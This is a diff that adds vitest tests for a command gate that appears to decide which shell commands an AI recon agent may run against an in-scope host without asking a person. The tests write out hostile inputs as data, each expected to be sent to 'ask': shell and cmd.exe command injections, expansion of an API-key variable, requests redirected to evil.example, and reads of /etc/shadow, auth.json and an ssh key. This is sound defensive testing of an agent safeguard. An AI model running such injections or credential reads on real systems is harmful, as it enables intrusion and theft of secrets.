@@ -1,6 +1,6 @@
 import { describe, it, expect, afterEach } from "vitest";
 import {
-  routeModel, classifyCommand, commandHazard, effectiveCommands, scrubEnv, withScrubbedEnv, modelFor, harnessFor, allCapped, hostOf,
+  routeModel, classifyCommand, isSavedOutput, commandHazard, effectiveCommands, scrubEnv, withScrubbedEnv, modelFor, harnessFor, allCapped, hostOf,
   activeProfile, activeProfileName, profileNames, parseProfile, parseReconHarness,
   DEFAULT_PROFILE, BUILTIN_PROFILES, type GateContext,
 } from "./recon.js";
@@ -92,7 +92,8 @@ describe("classifyCommand — tiny positive allowlist (default-ask)", () => {
   it("allows only GET fetches to the in-scope host, piped to pure read filters", () => {
     allow("curl -s http://quantum-local:8765/api/runs");
     allow("curl -sS -i http://quantum-local/x");
-    allow("curl -s -H 'X-Foo: bar' http://quantum-local/x");       // header value not mistaken for a URL
+    allow('curl -s -H "X-Foo: bar" http://quantum-local/x');       // header value not mistaken for a URL
+    expect(classifyCommand("curl -s -H 'X-Foo: bar' http://quantum-local/x", S)).toBe("ask"); // cmd.exe would read bar' as a second URL
     allow("curl -s http://quantum-local/x | grep -i cookie | head -50"); // pipe of safe stages
     allow("curl -s http://quantum-local/x | cut -d: -f1");
     allow("curl -sI http://quantum-local/x");                      // HEAD
@@ -189,7 +190,7 @@ describe("classifyCommand — BYPASS REGRESSIONS (from the Mythos review)", () =
     allow(F + "grep -c -e token");
     allow(F + "grep --color=never -in --max-count=3 csrf");
     allow(F + "rg -i -o token | sort -u | uniq -c | sort -rn | head -5");
-    allow(F + "cut -d: -f1,2 | tr -d ' ' | wc -l");
+    allow(F + 'cut -d: -f1,2 | tr -d " " | wc -l');
     allow(F + "tr a-z A-Z");
     allow(F + "tail -n +2 | column -t -s ,");
     allow(F + "jq -r .version");
@@ -281,5 +282,106 @@ describe("withScrubbedEnv — scoped hygiene across the spawn", () => {
     expect(seenSecret).toBeUndefined();        // secret hidden from the child
     expect(seenPlain).toBe("p");               // non-secret passes through
     expect(process.env.TEST_TOKEN).toBe("s");  // runner's env restored
+  });
+});
+
+describe("classifyCommand — searching a response (from the live runs)", () => {
+  const S2: GateContext = { scopeHost: "quantum-local" };
+  const allow = (c: string) => expect(classifyCommand(c, S2)).toBe("allow");
+  const ask = (c: string) => expect(classifyCommand(c, S2)).toBe("ask");
+  const OUT = "/home/node/.local/share/opencode/tool-output/tool_221f575590015PZ33rGHNfqxQM";
+
+  it("lets a pattern in double quotes carry what a pattern is made of", () => {
+    allow('curl -s "http://quantum-local/app.js" | grep -o "<script[^>]{0,300}>"');
+    allow('curl -s "http://quantum-local/app.js" | rg -o "api/[A-Za-z0-9_/.-]*|v[0-9]/[a-z]+"');   // a | inside the quotes is not a pipe
+    allow('curl -s "http://quantum-local/app.js" | grep -c "datatables\\.net"');                 // \. is two literal characters
+    allow('curl -s "http://quantum-local/x" | jq ".data | keys"');
+    allow('curl -s "http://quantum-local/x" | grep -E "(login|logout);?" | head -5');
+  });
+
+  it("still asks for anything a shell would act on, inside quotes or out", () => {
+    ask('curl -s "http://quantum-local/x" | grep "$(id)"');
+    ask('curl -s "http://quantum-local/x" | grep "`id`"');
+    ask('curl -s "http://quantum-local/x" | grep "a\\"; rm -rf /tmp/x; echo \\""');   // an escaped quote would move where the string ends
+    ask('curl -s "http://quantum-local/x" | grep "a\\\\"');                         // a backslash before a backslash
+    ask('curl -s "http://quantum-local/x" | grep "a\\$HOME"');
+    ask('curl -s "http://quantum-local/x" | grep "hi!"');
+    ask("curl -s 'http://quantum-local/x' | grep 'a|b'");          // single quotes: cmd.exe would read the | as a pipe
+    ask("curl -s 'http://quantum-local/x' | grep '<b>'");
+    ask('curl -s "http://quantum-local/x" | grep "a" > out.txt');  // outside the quotes nothing changed
+    ask('curl -s "http://quantum-local/x" | grep "a" ; id');
+    ask('curl -s "http://quantum-local/x" || id');
+    ask('curl -s "http://quantum-local/x" | grep "unbalanced');
+    ask('| grep "a"');
+    // cmd.exe opens a quote at the " inside the single quotes, so what follows would be unquoted there
+    ask(`curl -s 'http://quantum-local/"' | grep "x & calc.exe & "`);
+    ask(`curl -s 'http://quantum-local/"' "http://quantum-local/?a=1&calc.exe&"`);
+  });
+
+  it("holds on cmd.exe too, where ^ escapes a quote, %NAME% expands inside quotes and ' is not a quote (independent review)", () => {
+    ask('curl -s http://quantum-local/ -A ^" & calc & ^"');
+    ask('curl -s http://quantum-local/ -A ^" | calc ^"');
+    ask('curl -s "http://quantum-local/?x=%OPENAI_API_KEY%"');
+    ask("curl -s http://quantum-local/%USERPROFILE%");
+    allow('curl -s "http://quantum-local/search?q=a%20b%3Cx%3E"');          // URL encoding is still fine
+    ask("curl -s 'http://quantum-local/ -o C:/x http://evil.example '");    // several arguments to cmd.exe
+    ask(`grep -v 'zz C:/Users/me/.ssh/id_rsa b' ${OUT}`);
+    ask(`sort -t 'x C:/secret -o C:/out' ${OUT}`);
+    allow("curl -s 'http://quantum-local/x?a=1'");                           // a single-quoted word without a space is one word everywhere
+  });
+
+  it("reads words as the shell does: only a space or a tab separates them", () => {
+    ask(`rg "KEY|"\f${OUT}`);          // a form feed is not a separator to bash: one word, and no file named
+    ask(`rg "KEY"\u00a0${OUT}`);
+    ask(`rg "KEY"\v${OUT}`);
+    ask('curl -s "http://quantum-local/caf\u00e9"');
+    allow(`rg "KEY"\t${OUT}`);
+  });
+
+  it("sends one request, to the host that is named", () => {
+    ask('curl -s "http://quantum-local/a" "http://quantum-local/b"');
+    ask('curl -s "http://quantum-local\\@evil.example/"');
+    ask('curl -s "http://quantum-local/x#@evil.example/"');
+    ask('curl -s "http://quantum-local/x" -H "Host: evil.example"');
+    ask('curl -s "http://quantum-local/x" --header "host:evil.example"');
+    ask('curl -s "http://quantum-local/x" --retry 100');
+    allow('curl -s "http://quantum-local/x" --retry 2 -H "Accept: application/json"');
+    ask('rg "x" /tmp/opencode/tool-output/tool_abcdefgh12345678');          // not OpenCode's own data folder
+  });
+
+  it("does not let curl expand a quoted URL into many requests", () => {
+    ask('curl -s "http://quantum-local/users/[1-100000]"');
+    ask('curl -s "http://quantum-local/{admin,backup,config}"');
+    allow('curl -s "http://quantum-local/users/7"');
+  });
+
+  it("lets a filter search one saved tool output, named in full as the last argument", () => {
+    allow(`rg -o -N "path:.pay-invoice.{0,200}" ${OUT}`);
+    allow(`rg -c -i "authenticity" ${OUT}`);
+    allow(`grep -n "datatable" "${OUT}"`);
+    allow(`rg -o --no-filename "[a-z]+/v[0-9]/[A-Za-z0-9_/.-]{3,80}" ${OUT} | sort | uniq -c | head -40`);
+    allow(`head -c 4000 ${OUT}`);
+    allow(`wc -l ${OUT}`);
+    expect(isSavedOutput(OUT)).toBe(true);
+  });
+
+  it("asks for any other file, and for a saved output that is not named plainly", () => {
+    ask('rg "password" /etc/shadow');
+    ask('grep -r "key" /workspace');
+    ask("head -c 100 /home/node/.config/opencode/opencode.json");
+    ask('rg "x" /home/node/.local/share/opencode/tool-output/../auth.json');
+    ask('rg "x" /home/node/.local/share/opencode/tool-output/tool_abcdefgh/../../auth.json');
+    ask('rg "x" /home/node/.local/share/opencode/tool-output/');
+    ask('rg "x" tool-output/tool_abcdefgh12345678');                 // not written out in full
+    ask(`rg "x" ${OUT} /etc/passwd`);                                  // the saved output must be the last and only file
+    ask(`rg "x" /etc/passwd ${OUT}`);
+    ask(`rg --pre cat "x" ${OUT}`);                                    // a flag off the allowlist still asks
+    ask(`rg -f /etc/passwd ${OUT}`);
+    ask(`tr a b ${OUT}`);                                              // tr reads stdin only
+    ask(`cat ${OUT}`);
+    ask(OUT);
+    for (const p of ["/etc/passwd", "/home/node/.local/share/opencode/auth.json", "~/opencode/tool-output/tool_abcdefgh1234", "/x/opencode/tool-output/tool_ab", "/a/./opencode/tool-output/tool_abcdefgh1234"]) {
+      expect(isSavedOutput(p)).toBe(false);
+    }
   });
 });
